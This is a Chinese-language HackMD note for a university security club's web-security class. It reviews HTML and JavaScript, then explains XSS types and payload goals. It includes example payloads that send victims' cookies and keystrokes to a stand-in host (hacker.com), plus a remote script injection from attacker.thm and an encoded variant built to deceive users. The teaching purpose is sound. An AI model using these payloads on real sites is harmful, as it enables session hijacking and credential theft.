---
title: '2023 NISRA社課 Web II'
disqus: hackmd
---

2023 NISRA社課 Web II
===

## Table of Contents

課程影片:https://www.youtube.com/live/9NDCBN2scN8?si=eV7v3ew7qkbQfFlh

# -----社課提供共筆-----
# Web II

## Review

### How Web Work

![image](https://hackmd.io/_uploads/ry9TA-5V6.png)

### URL

- 統一資源定位器，俗稱「網址」
- 格式：
    [協定類型]://[網域]:[埠號]/[檔案路徑][檔名]?[參數]#[片段id]
- 範例：
    https://nisra.net:443/tmp/test.php?q=1#1

### HTML

![image](https://hackmd.io/_uploads/rkhUkfqN6.png)
Example:
```xml=
<!DOCTYPE  html>
<html>
	<head>
		<title>Page Titile</title>
	</head>
	<body>
		<h1>Example Heading</h1>
		<p>Example paragraph</p>
	</body>
</html>

```

### DOM物件文件模型

![image](https://hackmd.io/_uploads/r16qJMq4p.png)

- 以樹狀架構解析HTML文件

### HTML常用標籤
```
標題：<h1></h1>...<h6></h6>
段落：<p></p>
按鈕：<button>Click</button>
圖片：<images src=”images/dancing_cat.gif”>
輸入框：<input placeholder=”Input your name”>
超連結：<a href="fju.edu.tw">Click</a>
註釋：<!--comment-->
```
### JavaScript
- 輸出:
    - 在終端輸出:`console.log()`
    - 彈出對話窗:`alert()`
- 註解
    - 單行註解：`//`
    - 多行註解：`/*...*/`
- 函式
    ```javascript=
    function functionName(parameter){
	    /*function content*/
    }
    ```
    
### 引入JavaScript方式
- 1.寫在HTML裡
    ```xml=
    <html>
      <head>
        <script>
          alert();
        </script>
      </head>
      <body>
        ......
      </body>
    </html>
    ```
- 2.外部檔案引入
    ```xml=
    <head>
      <script src="./js/XXX.js"></script>
    </head>
    ```
- 3.寫在HTML元素的事件屬性中
    ```xml=
    <img src=”image” onload=”alert();”>
    ```
    
### javascript 操作 DOM
```xml=
<script>
  function change(){
    document.getElementById("abc").innerHTML="<h1>Be changed</h1>"
  }
</script>
<button onclick="change()" id="abc">test</button>
```
- 當 button 被點擊時，會去執行 `change()` 函式
- `change()` 函式中，會找到 `abc` 這個 id ，並將 `<h1>Be changed</h1>` 加進去

## Cross-Site Scripting (XSS)

XSS (Cross Site Script) 是一種把 JavaScript 注入到網站，意圖讓其他使用者執行的注入攻擊 (Injection Attack)，可以把使用者的 token 偷走假造使用者的身份登入、竄改頁面內容，或是把使用者導到釣魚網站。
- XSS Payloads 是什麼
- XSS 類型
- 如何建立 XSS payloads
- 如何修改 payloads 以避開過濾器 (filter)

### XSS Payload

XSS 的 Payload 是指希望在目標電腦上執行的 JavaScript code
從兩個方面思考 Payload 的使用
- 意圖 (Intension) : 你想用 XSS 做到什麼？
- 修改 (Modification) : 你要如何修改 code，以確保你的意圖在不同場景下可以執行實現

### Payload Intension

- Proof of Concept
- Session Stealing
- Key Logger
- Business Logic

### Intension : Proof of Concept

- 證明此網站存在 XSS 漏洞
- Payload Example : 
    - 彈出 alert box `<script>alert('XSS');</script>`

### Intension : Session Stealing

- 將受害者的 cookie 傳輸到攻擊者控制的伺服器
- Payload Example : 
    - 獲取受害者 cookie 並以 base64 編碼以傳輸至攻擊者的伺服器
        ```javascript
        <script>
        fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));
        </script>
        ```
- 防範：開發者可利用 HttpOnly 參數防止 JavaScript 存取 cookie

### Cookie String Type

Cookie 呈現形式
- 明文
    - Set-Cookie: logged_in=true; Max-Age=3600; Path=/
    - Set-Cookie: admin=false; Max-Age=3600; Path=/
- Hash
    - Set-Cookie: 1d34796b61840f5d3e0de003920e0b93; Max-Age=3600; Path=/
- base 64 編碼
    - Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
        -> {"id":1,"admin":false}

### Cookie & Session

Cookie 常用於網站身分驗證，Set-Cookie 和 Cookie 作為 header 傳送

![image](https://hackmd.io/_uploads/HkjdBzcEa.png)

 | Cookie                                     | Session                                             |
 | ------------------------------------------ | --------------------------------------------------- |
 | 儲存於瀏覽器<br>也儲存伺服器回傳的 Session | 使用者資訊儲存於伺服器<br>伺服器用 Session 身分驗證 |
 | cookie 生成時設定過期資訊(有生命週期)      | 伺服器決定 Session 是否過期                         |
 | 容易被竄改，安全性較低                     | 不易竄改，安全性較高                                | 

### Key Logger
- 將受害者在網頁上的輸入轉發到攻擊者控制的伺服器
- Payload Example : 
    - 如果此 payload 被注入在帳戶登入或輸入信用卡資料的頁面 → 危險
        ```javascript
        <script>
            document.onkeypress = function(e){fetch(
		        'https://hacker.com/log?key=' + btoa(e.key)
	        );}
        </script>
        ```



### Business Logic

- 利用 Business Logic，觸發網站原本的功能，呼叫特定網路資源或 JavaScript 函式
- Payload Example : 
    - 網站本身有一個更改使用者 email 的 JavaScript 函式 user.changeEmail()，攻擊者去觸發它
        ```javascript
        <script>user.changeEmail('attacker@hacker.thm');</script>
        ```


### 常見XSS類型
- 反射型XSS(Reflected XSS)
- 儲存型XSS(Stored Xss)
- DOM型XSS(DOM Based XSS)

#### 反射型

- 最常見的 XSS 攻擊類型，惡意程式碼不會儲存於目標伺服器中
- 注入方式：通常是將 payload 藏在網址列裡，放在 GET 參數傳遞
- 觸發方式：受害者需要點擊帶有 payload 的特定 URL 來觸發攻擊
- 影響範圍：僅限於單次單一使用者
- 反射型 XSS 例子 ：將 payload 注入在到網頁原始碼中
    ![image](https://hackmd.io/_uploads/rJc-wMcNa.png)
- 這種手法要能夠成功攻擊，需要使用社交工程釣魚的技巧，讓 User 點擊URL 攻擊才會生效。
    `https://website.thm/?error=<srcript src="https://attacker.thm/evil.js"><script>`
- 使用短網址或 HTML Encoder 的方式嘗試欺騙 User：
    ```!
    https://website.thm/?error=&lt;srcript src=&quot;https://attacker.thm/evil.js&quot;&gt;&lt;script&gt;
    ```
    
##### HTML 編碼

HTML 編碼原本是為了使特殊符號透過 HTML 編碼可以正常在 HTML 顯示，避免 HTML 將 URL 中的特殊符號視為語法，如：參數傳遞時包含 < 、> 等符號。

Hacker 反其道而行之：故意將要輸入在 URL 的特殊符號先轉換成 HTML 編碼或 URL 編碼，可以讓 Web Sever 解析成特殊符號，進而進行 XSS 攻擊。

#### 儲存型
- 注入方式：攻擊者將 payload 存儲在網站的資料庫 (database) 中，這些 script 會被伺服器返回並嵌入到網頁內容中。
- 觸發方式：只要訪問任何含 payload 的頁面，都會執行 Script
- 影響範圍：所有訪問相關頁面的使用者\
- 例子：
    網頁留言板注入 `<script>alert('xss')</script>`
    資料庫儲存後，每次只要有人用網頁瀏覽留言內容，都會執行 Script

#### DOM型
- 注入方式、觸發方式、影響範圍與反射型 XSS 類似。
- Hacker 在 URL 輸入 DOM 物件，把物/事件嵌入網頁程式碼。
- DOM 型 XSS 攻擊中，提取和執行惡意程式都是由瀏覽器端完成，屬於前端 JavaScript 的安全漏洞，而其他兩種 XSS 都是透過伺服器而產生的安全風險。
- 例子：
    ```javascript
    <img src=# onerror=”alert('XSS')”>
    ```

### XSS Payload Modification 範例 1

![image](https://hackmd.io/_uploads/rJuIufqEa.png)
![image](https://hackmd.io/_uploads/r1dpOz9Ep.png)

### XSS Payload Modification 範例 2

![image](https://hackmd.io/_uploads/HkXWYfcV6.png)
![image](https://hackmd.io/_uploads/SJEfKG54T.png)

## XSS Game
- [xss game](http://www.xssgame.com/)
- 目標：完成1~4關！


###### tags: `course`
